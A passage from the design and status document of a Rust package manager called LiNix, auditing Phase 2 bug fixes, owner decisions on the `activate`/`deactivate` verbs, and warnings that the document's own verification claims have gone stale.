"The seam held" is true of `src/backends/`, `src/core/` and `src/parsers/` — the seam was never
what these were on the wrong side of.

### `linix init -i` writes the old model — the ✅ verified one of two paths — **FIXED 2026-07-17**

**Fixed in Phase 2h.** `interactive_init` calls `scaffold_repo`, the `local.txt` write is
gone, and the three prompts for deleted settings are gone with the settings. **The lesson is
kept below verbatim, because it is the part worth keeping**: *"verified by running it"* was
the strongest evidence claim in this document and it was still partial — it ran the path the
author was thinking about.

Phase 2's checklist marks `linix init` done: *"Verified by running it: it produces a repo that
resolves."* True — of `linix init`. **`handle_init` (`main.rs:3429`) has two paths**, and
`interactive_init` (`:3457`) `return`s at `:3434` **before `scaffold_repo` (`:4294`) — the
only thing that writes `priority`, `active` and a profile — ever runs.** It wrote
`groups_dir/local.txt` (`:3616`) and interactively prompted for `prune_on_sync`, `prune_scope`
and `auto_prune`: three settings II.17 deletes and "the next action" is deleting now.

**Being fixed in the working tree as this was written** — the `local.txt` write is already gone
from the uncommitted diff. **Kept anyway, because the lesson is not the bug.** *"Verified by
running it"* is the strongest evidence claim in this document and it was still a partial
verification — it ran the path the author was thinking about. **Rule 11 is usually read as being
about `cargo test`. It is not: it is about any observation standing in for the plan.** A wizard
is a second path, and a second path is a second implementation.

### `activate` does not do what II.6 says (found 2026-07-17 — **being fixed in flight**)

> **Status at the time of writing: the working tree already fixes most of this.** `activate`
> takes `add: bool`, `-a`/`--add` exists, `Switch` is deleted, `parse_active` reads `when`
> blocks, and II.6's empty-names refusal is in the code verbatim. **The owner's four decisions
> (above) match what was built** — they were made from this entry and landed within the hour.
> **Retire the rest of this entry when that commit lands. Two things are not fixed:**
>
> 1. **`activate` overwrites a `when` block and does not say so.** `profile.rs` prints
>    `active is now {names}.` and never names the block it deleted. **Automatic is not silent
>    (S6)** — the owner chose "no refusal", not "no receipt".
> 2. **`deactivate` implements a rule the owner has since reversed.** `profile.rs:189` prints
>    *"Removed {} from the list. It is still activated by the `when {}` block…"* — **that is
>    the behaviour II.6 no longer specifies.** `deactivate` must now remove the name from the
>    matching block too, so that sentence is unreachable by construction. **It was built
>    correctly against the spec as it read at the time; the spec moved.** The replacement
>    message is for the *other* case only — a block that does not apply to this host, which is
>    left alone. `model/profiles.rs:459`'s comment says it exists to support the old sentence;
>    **the machinery it feeds is still needed, for the opposite purpose.** Do not delete the
>    block-awareness — re-point it. *(Related, unjudged: these go
> to `info!`/`tracing`, not stdout. II.6 says the commands **print** what they touched. Whether
> a user with default settings ever sees them is untraced.)*

Not marked ✅ — **worse: II.6 was written as a specification of existing behaviour and it
describes the opposite of the code.**

| II.6 says (`:345`) | `app/profile.rs` does |
|---|---|
| `activate NAME…` — *the file becomes exactly this list* | **adds.** `:78-96` reads `active`, pushes what's missing, writes it back. This is `activate -a`. |
| `activate -a NAME…` — *adds* | **no `-a` flag exists.** `cli/args.rs:334-338` takes `profiles: Vec<String>` and nothing else. |
| — | **`profile switch NAME` (`args.rs:737`, `profile.rs:123`) is the set form**, one name only, and appears nowhere in this document. |

`args.rs:332` documents `activate` as *"add each to the active set"* — **the CLI help and II.6
contradict each other in the same repo.** The refusal at II.6:360 (*"activate needs a profile
name…"*) does not exist; `#[arg(required = true)]` prints clap's generic error. `-r` is
genuinely gone (verified).

**And `active` cannot hold a `when` block, which II.6:330 shows it holding.**
`write_active` (`profile.rs:257-269`) rebuilds the file from a flat `Vec<String>` — **any
activate/deactivate silently destroys every block in it** — and `parse_active`
(`model/profiles.rs:194`) rejects any line with more than one word, so `when host == laptop {`
is a hard error: *"`when host == laptop {` is not a profile name"*. The II.6 example file does
not parse. **Decide which is right before building the verb, not after.**

### VI.1 "killed by this design — no work needed" — two rows are live bugs (found 2026-07-17)

**VI.1 is a list of finished-claims and belongs under this section's rule.** *"Killed by this
design"* is only true once the design is **built**; two rows are killed by designs that are
**not started**, so the bug is live and filed as needing no work — the exact failure a false ✅
causes, wearing a different word.

- **`linix shim --source` — marked "(verified)". It is a live bug.** `cli/args.rs:100` makes
  `--source` **required**; `main.rs:2883` → `context.rs:612`
  `pub async fn create_shim(&self, binary_name: &str, _source_spec: &str)` — **the underscore
  is the bug.** The user is forced to supply a value that is discarded, so
  `shim rg --source cargo:ripgrep` and `--source apt:nonsense` do the same thing. What kills
  it is II.16 (shims as declared lines) — **unbuilt**, and S4 routes the shim path to Phase 3,
  **not started**.
- **E12 `confirm_destructive` gates the wrong thing.** **`module` overwrite fixed in Phase 2k**
  — II.8 says destroying a file you wrote is a plain refusal plus `--force`, and it is now
  exactly that, wired to nothing. **The other two sites are live**: `main.rs:966` and `:1118`
  gate `install`/`uninstall` confirmation, which is the II.10 guard's job — Phase 3, not
  started. `confirm_destructive` itself is in II.17's delete list and dies with them.

**Also contradictory:** E4 says two snapshot retention engines need no work; **S2 routes its own
fix to "Phase 4 (one retention engine)"** — the document says both that the consolidation is
unnecessary and that a bug waits on it. *(A check for the second engine found only one — both
`snapshot.rs:455` and `generation.rs:262` feed `core::RetentionPolicy`. E4 may simply be stale
wording rather than a real pair. **Decide it; do not leave it readable both ways.**)*

**The rule this earns:** VI.1's rows must name the phase that kills each bug, and a row whose
phase is unstarted is **not** "no work needed" — it is *work scheduled elsewhere*, which is a
different sentence with a different reader response.

### The shape of all of it

**The new model was built alongside the old one, and the old one was never removed.** That is
the "two ways to do one thing" disease Phase 2 explicitly forbids — *"do not run two models
behind a flag"* — arrived at by accretion rather than by decision, which is why no one chose
it and no test objects.

**The most dangerous artifact is not a false ✅ — it is a comment asserting a deletion that
did not happen.** ~~`model/profiles.rs:24` states there is no `_active_profiles.txt` and no
materialization. `app/profile.rs:347` writes it on every `activate`.~~ — **retired 2026-07-17:
the comment came true.** Phase 2f deleted the writer; `grep -rn "_active_profiles\.txt" src/`
now returns that comment and nothing else. **The example is retired; the rule it teaches is
not: trust neither the ✅ nor the comment. Grep.** The replacement example is one line down,
and it is worse, because a comment can only lie about one file — **`linix why` lies about the
whole model** (below).

> **The retirement grep in this section was broken and could never have gone quiet.**
> `grep -rn "_active_profiles\|RESERVED_MANIFEST"` matches the *test name*
> `the_seam_carries_what_the_active_profiles_reach` (`sync/resolver.rs:466`) — the `_active_profiles`
> substring sits inside `what_the_active_profiles_reach`. A fixed entry read as unfixed forever.
> **Anchor a retirement grep on the filename (`_active_profiles\.txt`), never the bare stem** —
> a tripwire that cannot go quiet is not a tripwire, it is a permanent false finding, and this
> section's whole ritual is "run it and believe the result."

**Recommended order, given the above:** finish the deletions **before** II.8, not after.
Every verb added on top of the six non-validating parsers, `groups_dir`, and `local.txt` is a
verb that has to be rewritten when they go — and II.8 is the biggest surface in the plan.

## The one thing to understand before continuing

**The model now runs resolution.** `StateResolver::resolve_desired_state` builds the II.1
`Layout` from config, loads `priority`, runs `model::Resolver`, and probes bare names. The
seam signature is unchanged, so `src/backends/`, `src/core/` and `src/parsers/` never
noticed. `tests/e2e_tests.rs` now drives module → profile → resolve → plan → execute →
registry on the new model.

**The branch did not stay red, and that is not a warning sign** — the seam held. What broke
was six tests written against the deleted model (`@module:`, `.module.txt`, the `groups_dir`
crawl, `manifest:` tags). Each was ported to the II.1 layout with its guarantee intact, not
deleted.

**Two things the wiring changed that the plan did not anticipate.** Both are in VI.2:

- **S13 (fixed).** Probing had to move *between* reading the files and merging them. Keyed
  `?:ripgrep` until probed, a bare `ripgrep` never met an explicit `cargo:ripgrep`, so rule
  5 silently did not apply to bare lines and both were installed. `model::Resolver` now
  splits: `statements()` → the caller probes → `with_bare(answers)` → `collect()`.
  `resolve()` still does both, for callers that need no probe.
- **`__scopes` is new, and `__source` changed meaning.** They were one tag doing two jobs,
  which is how `upgrade --module dev` came to be matched against a filename. `__source` is
  now `file:line` — what II.8's messages and every error need. `__scopes` carries
  `module:dev;profile:Work` — what `--module` / `--profile` match on. The model writes it
  because it is the only thing that knows profile→module. `collect` keeps **every** origin
  of a merged package, not just the winner's: the loser's scope is not thereby untrue.

## Where Phase 2 is holding (2026-07-17, after Phase 2v/2w)

**The Phase 2 checklist is complete.** Every box under "Phase 2's remaining checklist" is
now `[x]`. What landed this session, each committed and verified against the binary or with
tests, clippy silent throughout (≈521 tests):

- **S12 done** — all three ordering phases: `repo:` before packages (`apply_repositories`),
  packages, then `shim:`/`service:`/`link:` after (`apply_dependents`), in declaration order.
  `watch` runs the same three phases. (2o–2p)
- **Grammar's last II.2 gaps closed** — `@until` refused on present lines; `link:` no longer
  eaten by set-math precedence; the option-key whitelist (S19) confirmed. (2q)
- **Old-model teardown** — `config/parser.rs` 437→215 (the `@module:`/`groups/` crawl gone);
  `Config::groups_dir`/`modules_dir` fields replaced by one `config_root`; the retired `lease`
  command deleted; the `config.toml` backend-selection cluster (`enabled_backends`,
  `hostname_backends`, `backend_priority`, `default_backend`) deleted and `search`/`rollback`/
  `repo`/planner-drift routed through the `priority` file. (2r–2t)
- **Cycle errors name the cycle** (V.45) — the planner reports `apt:foo (file:line) -> apt:bar
  -> apt:foo` via Tarjan SCC. (2u)
- **II.8 read-only surface** — `status`/`list`/`plan` reviewed; `unmanaged` is E6-fixed; the
  two missing verbs `check` and `absent` were built. (2v)
- **S14** — `init` no longer lists `service`/`link` in the generated `priority`. (2w)

**Everything found here is now folded into the plan — nothing is left as loose prose:**

1. **S20 — drift for extras → Phase 4.** A `service:`/`link:`/`shim:` line the user *removes* is
   not reconciled away; it needs a durable applied-extras ledger to diff against, which is the
   same state machinery `locks/` introduces. Forward direction (apply) is done. Tracked in VI.2.
2. **S21 — `schedule:` wiring + its file-context rule → Phase 5.** The resolver never reads the
   `schedules` file; `schedule:` only lands in `extras` and `sync` warns. Wiring it (read the
   file, provision via `SchedulerManager`, enforce "only in `schedules`") is one Phase 5 job.
   Tracked in VI.2.
3. **The green-harness exit → Phase 5/6.** Resolved in the Phase 2 exit note above: the harness
   rebuild belongs to Phase 5, so the gate is carried there rather than run against a harness
   that asserts the old surface. The model-side of Phase 2 is complete and verified.
4. **Grammar-comment accuracy — the "II.2's full list" comment is FIXED (Phase 2x);** the
   `schedule:` file-context half is folded into S21 (it cannot be checked until `schedule:` has
   a home).

**So Phase 2's *build* is done.** The two remaining functional gaps (S20, S21) are genuinely
later-phase work by their dependencies, not Phase 2 corners cut — each is tracked with its
reason and its phase.

## Done in Phase 2l — `uninstall`, and the symmetric pair is symmetric again

**`uninstall` obeys P1 (S15 closed).** It removed the package first and edited the file
after; now the file edit IS the command and sync carries it out — so the removal goes through
the guard, the plan and the counts like every other removal, rather than reaching for the
backend directly and asking the guard on the side. `install` and `uninstall` are the
symmetric pair V.39 describes again.

**Both of II.8's `uninstall` rules are built, and verified against the binary:**

- *"jq is still declared in module `gaming`, which isn't active. It will come back if you
  activate Gaming."* — deleting the line you can see while an identical line waits in a
  module you forgot about is a package that returns the next time you switch profiles.
- *"steam isn't declared, so there's nothing for it to come back to. Did you mean a plain
  uninstall?"* — `--temp` on something undeclared.

**`uninstall --temp=2h` is a suspension now (II.16, V.37).** It writes
`absent:cargo:ripgrep@until=2026-07-17T16:17` and the model does the rest: a dated line beats
an undated one (II.7 rule 6), so the module that wants it loses until the date passes, and
then wins again. **Verified end to end** — the package is not wanted while suspended and is
wanted again once the date is in the past. "Take the game away until the weekend" works, with
no timer and no sweep: the same dated-line machinery `install --temp` uses, pointed the other
way.

Bare `--temp` (restore on shell exit) stays outside the model on purpose (II.8): a shell
session is not a declaration, so it writes no file — and it now calls the guard, which it
did not before (C1).

**Found: S19** — `@lease=2h` still works by hand, and it is the one option key that can
uninstall your package, on a path C3 says bypasses the guard.

## Done in Phase 2o — repos, the first ordering phase

**`repo:` lines are applied (S12, partly).** They resolved and were dropped; now `sync`
resolves the whole `DesiredState` and `App::apply_repositories` runs the `repo:` lines FIRST
— add the repository, then refresh that backend's index — before the package plan. This is
II.7's ordering, and it is the one that decides something: a package from a PPA cannot
install until the PPA is added and `apt update` has seen it. Verified against the binary: the
add and the refresh log before the flight plan.

**The owner decided how a `repo:` names its backend (V.47):** explicitly, like a package line
— `repo:apt:ppa:deadsnakes/ppa`. A repository belongs to one manager, and guessing runs the
wrong system command. A bare `repo:ppa:...` is a parse error, and a backend not in `priority`
is refused in the file (V.15) — both caught before any command runs.

**~~Still owed on S12~~ — done in Phase 2p (below):** `shim:`, `service:` and `link:` as the
*dependent* phase, applied AFTER packages. `schedule:` belongs to the scheduler, not the sync
ordering, and stays owed.

## Done in Phase 2p — dependents, the third ordering phase (S12 done)

**`shim:`, `service:` and `link:` are applied AFTER packages (S12 closed).** `App::apply_dependents`
is the mirror of `apply_repositories`: it walks `DesiredState::dependents()` — the extras that
lean on a package — and dispatches each. A `service:` becomes a `service`-backend install
(`systemctl enable`, `sc config`, `rc-update add` — whatever the host's init is); a `link:`
becomes a `link`-backend install (symlink / rendered template / decrypted secret / managed
content); a `shim:` deploys through `ShimManager`. They run in **declaration order**, so a
config `link:` written above the `service:` that reads it keeps that order.

**Why a distinct phase and not part of the package plan:** each one presupposes a package —
a shim wraps a binary that must already be on disk, a service enables a unit a package just
installed, a link writes the config a package expects. So they wait for the whole package
plan to finish; they cannot be interleaved. `DesiredState` grew `dependents()` (the three
after-package extras, in order) and `has_dependents()`, and `sync`'s "System matches" exit
now checks the latter — a config that is all `service:`/`link:`/`shim:` and no package
changes is still work, and previously would have exited "nothing to do".

**Verified against the binary.** A repo + package + `service:` + `link:` + `shim:` + `schedule:`
config, `sync --dry-run`: `schedule:` warns by file and line, the Flight plan installs the
package, THEN service → link → shim preview — in that order, after the packages. A
dependents-only config previews the three and does *not* say "System matches"; a truly empty
config does. Tests: `dependents_are_the_after_package_extras_only` and
`a_config_with_no_extras_has_no_dependents` (model), `dependents_only_config_resolves_and_applies_the_dependent_phase`
(integration, hermetic). 528 pass, clippy silent.

**`watch` runs the full ordering too.** The unattended reconcile resolved packages-only
(`resolve_desired_state`), so it silently skipped *both* phase 1 (repos) and phase 3
(dependents) — an unattended machine would never add a PPA or enable a `service:` until
someone ran `sync` by hand. It calls `resolve_model` + `apply_repositories` +
`apply_dependents` now, the same three phases as `sync`.

**Still owed (not S12's forward direction — one new, smaller item):** *drift for extras* —
reconciling away a `service:`/`link:`/`shim:` line the user *removed* (the forward direction
is done; the teardown is not, because the planner tracks package drift, not extra drift). A
Phase 2 follow-up.

## Done in Phase 2q/2r/2s — the grammar's last gaps and the old-model teardown

**2q — the last two unenforced II.2 grammar rules.** The 2026-07-17 audit found three II.2
rules whose implementation was a comment, not a check. One (`@versionn` key whitelist) was
already fixed by S19. The other two are now enforced: **`@until` is refused on a present line**
(`validate_options` takes `absent: bool`, threaded from `parse`'s `absent:` branch, and points
you at `@expires`), and **`link:` no longer parses as set math** — the expression check yields
to any typed-statement prefix, so `link:C:\Users\me\.vimrc` (full of `\`, which
`looks_like_expression` fires on) is a `Statement::Link` again. Tests for both.

**2r — the old-model crawl is gone.** `config/parser.rs` 437 → 215 lines: the whole
`@module:`/`groups/` crawl (`ManifestLine`, `identify_line`, `parse_group_file`,
`filter_conditional_lines`, `load_all_packages`, `write_group_file`) deleted with its 7 tests;
kept `HostFacts` + `eval_when` (the model's `when` engine) and `split_removal_target` (the one
colon-parser that validates against the registry). **`Config::groups_dir` and
`Config::modules_dir` fields deleted** — one `config_root` field replaces them, `config_root()`
returns it directly (was `groups_dir.parent()`) with the never-resolve-to-CWD guard kept, and
all 29 call sites (locks, policy, generation restore, `watch`, the doctor) moved onto it.
Binary verified against a bare `config_root` with no `groups/` subdir.

**2s — the retired `lease` command is deleted.** II.16 replaced leases with dated lines and
S19 stopped `state.add` reading `@lease`; the imperative `lease set`/`lease list` was the last
of the concept, and `lease set` was the last non-validating `split_once(':')` parser (C13). Gone:
`Commands::Lease`, `handle_lease`, `LeaseArgs`/`LeaseCommand`, `StateRegistry::update_lease`.
`install --temp`'s help now says `@expires`, not `@lease`.

## Done in Phase 2j/2k — the commands that still read the deleted model

**`why` asks the model** — the audit's worst finding, answered in full above.

**`adopt` writes `modules/adopted.txt` (II.9).** It wrote `migrated_<timestamp>.txt` into
`groups_dir`: a folder nothing reads any more, under a name that made **the second `adopt`
declare every package twice** — which the resolver then refuses as a contradiction (II.7 rule
5). One file, overwritten, so adopting again answers "the machine as it is now" rather than
"the machine plus history". It goes through the editor, so `use adopted` reaches the active
profile and says so.

**`module` runs on II.1.** It listed `*.module.txt` — a suffix II.1 does not have — so
`module list` printed **nothing** on a real repo, and `module show`/`create` addressed files
the resolver never reads. Now `modules/<name>.txt`, and **the folder decides**: `module list`
asks `ModuleLoader::available()`, so a `README.md` in `modules/` costs nothing (II.3).

**E12 is fixed for `module` (II.8).** Overwriting a module you wrote was gated on
`confirm_destructive` — a setting about *package removals* deciding whether your file
survives, which is one prompt meaning two unrelated things. It is now a plain refusal plus
`--force`, like every other tool, and wired to nothing.

**`bundle` copies your repo, whole.** It copied `groups/` and `modules/` by name, so under
II.1 it silently left `profiles/`, `active`, `priority`, `locks/` and `preferences.toml`
behind — a bundle that restores half your declarations is worse than one that fails.

**Found, not fixed: S18** — `auto_lock_checksums` rewrites your module files on every sync,
and defaults to true. It is Phase 4's thread (a checksum is a lock), and it is the last
caller of `ManifestEngine` and the last real reason `groups_dir` exists.

## Done in Phase 2i — `activate` does what II.6 says, and `active` gained `when`

Answered the audit's `activate` finding in full; the details are in that section, marked
FIXED. The shape of it: **II.6 described the opposite of the code**, the CLI help contradicted
II.6 in the same repo, and `profile switch` — the set form under a second name — was not in
this document at all. `activate` sets, `activate -a` adds, `switch` is deleted, and the empty
list gets II.6's refusal instead of clap's.

**`active` holds `when` blocks.** It was the one file that broke II.2's "one rule, everywhere"
— `parse_active` rejected any line with more than one word, so **II.6's own example file was a
hard error**, and `write_active` rebuilt the file from a flat list so any activate/deactivate
silently destroyed every block in it. `read_active` now gates them, `deactivate` edits
top-level lines only, and a name a block also holds is reported rather than silently ignored.

## Done in Phase 2h — the guard, and sync becoming sync

**Two live safety bugs, both contradicting II.10's "nothing overrides". S16 and S17 in
VI.2.** `--allow-mass-removal` cleared every objection including protected and OS-essential;
`[guard.enforce_on]` was a config key that switched the guard off per command. **The first
had a test asserting the broken behaviour** — the bug was written down as an expectation,
which is why it survived review. Both fixed, with the tests II.10 actually implies.

**`prune_on_sync`, `prune_scope`, `with_prune` and `protect_imperative` are deleted, and
sync removes drift because that is what sync IS (V.34).**

- `prune_on_sync` made "does sync converge?" a setting. A sync that does not remove drift is
  not sync; it is `prune` with the install half amputated, which is the thing V.34 deleted.
- `prune_scope = "system"` was **the setting V.21 forbids in so many words**: flip it and a
  routine sync deletes software LiNix never installed. That is `purge-unmanaged` — **a
  command you type, not a mode you inherit** — which is why deleting the mode and building
  the command had to be one change. Deleting it alone would have removed a real feature.
- `protect_imperative` guarded against a bug that no longer exists. An imperative install
  had no line, so it read as drift the moment it was recorded; it has a line now
  (`modules/imperative.txt`), so it is declared like everything else.

**`purge-unmanaged` is built (II.11).** The ratio, not the count (V.20 — on Alpine a count
misses 14-of-14); `max_removals` does not apply because it catches accidents and this is
deliberate; protection and OS-essential still do; snapshot first, automatically, and **"THERE
IS NO UNDO FOR THIS" when none can be taken**; the whole list, every line, because the pain
is the feature; typed confirmation.

**Guided setup lost four questions that stopped existing**: "should sync remove drift?" (it
is drift removal), "how aggressive?" (that is `purge-unmanaged`), "protect imperative
installs?" (they are declared now), "preferred default backend?" (that is `priority`,
detected). A question whose answer LiNix can work out is homework (V.41).

## Superseded — the note this section carried before

This section previously warned that making sync remove drift by default was "the shape of
this repo's flagship bug". **That was overcautious, and reading V.21 and II.7 carefully is
what corrected it.** Sync removes *what it manages and you stopped declaring* — bounded by
the registry, not by the machine. The flagship bug was the opposite shape: `-g` moved the
wish list while the registry stayed put, so owned-but-unwished read as drift (V.1). The
dangerous thing was never sync converging; it was `prune_scope = "system"`, which let sync
reach outside what it owns. That is now impossible rather than merely off by default —
which is what V.21 means by "not safe by default, but safe permanently".

## Done in Phase 2f — set math, and the last of the old profile engine

**`app/profile.rs` was the last whole copy of the old model.** 657 lines that still write
`_active_profiles.txt` on every `activate`, and still hold `compose()`: a second, complete
profile-composition engine duplicating `model/profiles.rs`. Its `active` file is in the wrong
place (`profiles/active`, not the config root) and its profiles are `<name>.profile`, not
II.5's Capitalized `profiles/<Name>`. Nothing about it agrees with the model that now runs
resolution.

It is now 348 lines and runs on the model. `materialize()` is gone (a materialised copy is a
second place the same fact lives), and `compose()` — a second complete profile engine — is
gone with it.

**II.4's set math is implemented, and the decision behind it is V.46.** It was specified and
never built: `ProfileLoader::resolve` handled only `use`, and `evaluate_expression` had no
caller outside its own tests. It now works end to end — verified against the binary, not just
tests. `exclude`, `intersect`, `-pkg` and full expressions like `(Work | gaming) & security`,
with II.4's fixed order: gather, narrow, subtract, and **subtraction always wins** whatever
order you wrote the lines in.

**V.46 predicted a cost that turned out not to exist, and the entry says so.** The prediction
was that set math would cost a package its module name. It does not: atoms map back to the
**statements** they came from, so a package keeps its `Origin`, its file, and its module.
`upgrade --module editors` still finds `vim` through an `exclude`.

Also settled there: **`include` is gone** (V.46). `use` already meant union, and two words for one
operation is the disease this design cures, sitting inside the spec. `include x` is an error
that says `use x`.

## Phase 2's remaining checklist

- [x] Wire `model::Resolver` into `StateResolver`.
- [x] **`local.txt` and `keep.txt` are deleted, and S9 with them.** `model/edit.rs` is the one
      writer now: `install`, `uninstall`, `forget`, `teleport`, `service enable/disable` and
      the package-manager hook all go through it, and it parses every line with the grammar
      rather than splitting on `:`. `--into` exists (II.8). The three landing modules exist,
      and the first write to one adds `use <name>` to the active profile and says so.
- [x] **`linix init` writes the II.1 repo** — `priority` generated from what this machine
      actually has (V.41), ordered by V.14's one real rule, with its reason in the file (P5).
      Verified by running it: it produces a repo that resolves. **S14 fixed (Phase 2w):**
      `starter_order` now drops `service`/`link` (dependent statements, not managers, never
      priority-gated). `web`/`github`/`appimage` stay — the model refuses an explicit `web:…`
      unless `web` is listed (V.15), so excluding them would break those specs; S14's lumping
      them in was imprecise.
- [x] **S12 — done (Phase 2o + 2p).** `repo:` applies before packages (`apply_repositories`),
      `shim:`/`service:`/`link:` apply after (`apply_dependents`), in declaration order. The
      extras that used to be dropped at the seam are now walked off `DesiredState::extras`
      around the package graph. Only `schedule:` still warns by file and line — the scheduler
      owns it. Follow-ups (extras-drift, `watch`) noted in "The next action, precisely".
- [x] **`local.txt` and `_active_profiles.txt` are deleted** (Phase 2e, 2f). S9 died with
      `local.txt`. *Corrected: Phase 2e's commit said `line_declares` was deleted; that was
      true of `config/parser.rs` and **there was a second copy in `insight.rs`** — deleted in
      Phase 2j. "Deleted" means the grep is empty, not that the copy you were looking at is
      gone.*
- [x] **The `config.toml` backend-selection cluster is deleted (Phase 2t).** `priority`
      (II.6) replaced four settings that said one thing between them; the model read the file
      but `search`, `rollback` scope, `repo`'s default, and the planner's drift gate still read
      the config fields. Now all read `priority`: `App::priority_backends()` feeds `search` and
      `rollback`; `ChangePlanner::with_enabled(..)` scopes drift so a backend you stop listing
      is left alone, not reaped (imperative paths/tests default to "all"). Deleted:
      `enabled_backends`, `hostname_backends`, `backend_priority`, `default_backend`,
      `effective_enabled_backends`, `is_backend_enabled`, `default_priority`, and their tests.
      *(No global `-b` flag exists — the planner comment claiming one was stale.)* Other stale
      `config.toml` example keys (`bloatware_file`, `[managed_files]`, `[hostname_packages]`)
      are Phase 5 docs debt, not live fields.
- [x] **The old-model crawl is deleted (Phase 2r).** `config/parser.rs` 437 → 215 lines:
      `ManifestLine`, `identify_line`, `parse_group_file`/`parse_group_str`,
      `filter_conditional_lines`, `load_all_packages`, `write_group_file` — the whole
      `@module:`/`groups/` crawl the model replaced — all gone, with their 7 tests. Kept
      `HostFacts` + `eval_when` (the model's `when` engine, 5 live refs) and
      `split_removal_target` (the one `split_once(':')` that consults the registry, so *not* a
      C13 non-validating parser). **`Config::groups_dir` and `Config::modules_dir` fields are
      gone too** — a single `config_root` field replaces them, `config_root()` returns it
      (CWD-guard kept), and all 29 call sites moved to `config_root()`/`config_root().join(..)`.
      *Remaining C13 surface:* the grammar is the one **statement** parser now, but a couple of
      colon-splitters survive for non-statement jobs (`main.rs:679` a `requires` target,
      `ecosystem.rs:275` a `name:ver`) — neither reads a backend name, so neither is the C13 risk.
- [x] **E6** — `unmanaged` is one function now, *"what `adopt` would adopt"* (Phase 2m).
      **E7** fixed with it: adopt takes protected packages; only OS-essential is held back.
- [x] **Ordering phases: repos → index refresh → packages → dependents (Phase 2o + 2p).**
      Applied by `sync` around the package graph, not inside `core/transaction.rs` (the seam
      keeps `core/` ignorant of repos and extras). Verified against the binary.
- [x] **Cycle detection error text (V.45) — done (Phase 2u).** Detection was already right in
      all three places; only the messages were owed. The two `use` loops (`profiles.rs`,
      `modules.rs`) already name the path (`a -> b -> a`). The planner's was *"Circular
      dependency detected in graph construction."* — naming nothing — and now names the
      mutually-dependent packages **and their file:line**, `apt:foo (modules/dev.txt:3) ->
      apt:bar (…) -> apt:foo`, via Tarjan's SCC (self-loops handled separately). As predicted,
      `PackageSpec` needed no `Origin` field: `options["__source"]` is `file:line` and the
      planner already read it. Tests for the 2-cycle and self-loop cases.
- [x] **The II.8 command surface is built.** `install` (P1 order, `--into`, `--temp` ->
      `@expires`), `forget`, `teleport`, `service enable/disable`, the hook, `purge-unmanaged`,
      `activate` / `activate -a` / `deactivate` / `why`, `uninstall` (P1 order, both II.8
      warnings, `--temp` -> `absent:@until`), `module`, `adopt`, `bundle`. **Read-only verbs
      reviewed against II.8 (Phase 2v):** `status`/`list`/`plan` are read-only and correct,
      `unmanaged` is E6-fixed (*"what adopt would adopt"*), and the two II.8 verbs that did not
      exist — `check` (*"parse everything, report errors"*) and `absent` (*"every absent: line
      in force, and its module"*) — were built. Verified against the binary: `check` flags a
      backend missing from `priority`; `absent` lists each absent spec with its `__source`.
      *(The retired `lease` command was deleted in 2s.)*

## Decisions the owner has made — do not re-open

| | |
|---|---|
| **V.43** | Keep all nine guard refusals, including the three orphaned `policy.toml` rules (`pinned_only`, `require_snapshot`, `deny_vulnerable`). II.10's "five" was wrong. |
| **S6** | `sync` heals **automatically**. Asking permission to fix drift asks permission to do sync's own job. Automatic ≠ silent: it must say what it did, and the removal still goes through the guard. |
| **S8** | Keep `undo`. Keep its path check (renamed to say it guards the snapshot-read path). Delete the false global claim. Restore must state it rolls back the whole filesystem before asking. |
| **II.6 verbs** (2026-07-17) | **Three verbs, as II.6 already said: `activate` SETS, `activate -a` ADDS, `deactivate` REMOVES.** The code had `activate` adding and the CLI help documenting it that way — **the spec was right and the code was wrong.** Not a re-opening: II.6 was already correct, the audit found the drift. |
| **`profile switch`** (2026-07-17) | **Dies.** Once `activate` sets, `switch NAME` *is* `activate NAME` with a worse name and a one-name limit. It was the set form only because `activate` had wrongly taken the add form's job. **Two ways to do one thing** (P1). |
| **`when` in `active`** (2026-07-17) | **`active` holds `when` blocks.** `when` gates every other file (II.2); `active` being the exception was an accident of `parse_active` rejecting any multi-word line — which made **II.6's own example file fail to parse.** One rule, everywhere. |
| **`deactivate` vs blocks** (2026-07-17) | **`deactivate` removes the name from the top level and from every `when` block that applies to this host** — empty blocks go with it, and it says so. **Reverses II.6's old *"it is still activated by the `when` block on line 4"* bullet**, which described a verb that removed the line and left the thing on. **A block that does not apply to this host is never touched**: nothing there is active, so there is nothing to deactivate, and `active` is a shared file — editing another host's block from this one changes a machine you are not at. It says why and changes nothing. **This is the one place `deactivate` edits a block and `activate -a` does not: adding has a choice of where to put the name; removing does not.** |
| **`activate` vs blocks** (2026-07-17) | **`activate` overwrites the file, blocks included.** It is the set form; it sets, and a block is part of what the file says. **`activate -a` and `deactivate` never touch a block** — they are the surgical pair, and that asymmetry is why `-a` exists. **It does not ask** (declarative: overwriting the list is the command's job) **but it does not do it silently** (S6) — it names every block it removed. *Asking and reporting are not the same thing, and the argument against the first is not an argument against the second.* |

## A warning about this document

**Every "(verified)" / "(measured)" fact in this spec that has been checked has been wrong —
seven for seven, always under-reporting.** They were measured against an older tree. Corrected
so far: the comment count (139 → 884 + 32 false), both good-comment exemplar citations, the
parser count (5/3 → 8/6 → **9/6**, wrong twice, the second time by a re-measurement that was
itself called "(re-measured)"), the backend count, and — the expensive one —
**"`reconcile_shims` is written and never called (verified)"**, which was false and was the
sentence hiding a bug that made every `sync` delete the user's own files out of
`~/.local/bin` (S1).

**The ✅ markers fail the same way, and worse.** Phases 0 and 1 were both marked complete
while untrue (2026-07-17 audit, Part VII) — under a rule, already written at the top of this
document, that says *"never describe unverified work as done."* **The rule was not enough.**
A wrong measurement makes a reader over-confident; **a wrong ✅ makes a reader skip the work
entirely**, and nothing downstream will object, because the code it should have deleted is
still there passing its tests.

**The bias was one bias, in two costumes: this document flatters the codebase.** Measurements
understate the mess; status markers overstate the progress.

> **The 2026-07-17 second pass produced the first counter-examples, and the rule has to change.**
> `_active_profiles.txt` was **fixed and still filed as broken**; C13's skipper count was **six
> and is three**; `resolver.rs:212` was cited as a non-validating parser and **no longer parses
> anything**. In each, the **tree was better than the sentence** — the first time that has ever
> happened here.
>
> **This is not good news and it is not permission to relax.** The old rule ("assume the tree is
> worse") was a *heuristic that let you skip checking*, and it has now failed in both directions,
> which is the only thing that could have shown it was always the wrong kind of rule. **The
> document is not biased pessimistic or optimistic. It is stale**, and stale drifts whichever way
> the tree moved. **The replacement rule is not a direction, it is a refusal to guess: no claim
> here is evidence of anything. Run the command.** Note which way this one broke — a *fixed* entry
> read as broken costs someone a day re-fixing it, and a *stale* count read as a target
> (**"Fixed when: 1"**) would have had them delete a working validator to hit a number.

**Line numbers rot faster than claims — and this very example rotted again.** V.29 cites
`planner.rs:407-426` for `spec.requires`; **this document corrected that to `:431`, and it is now
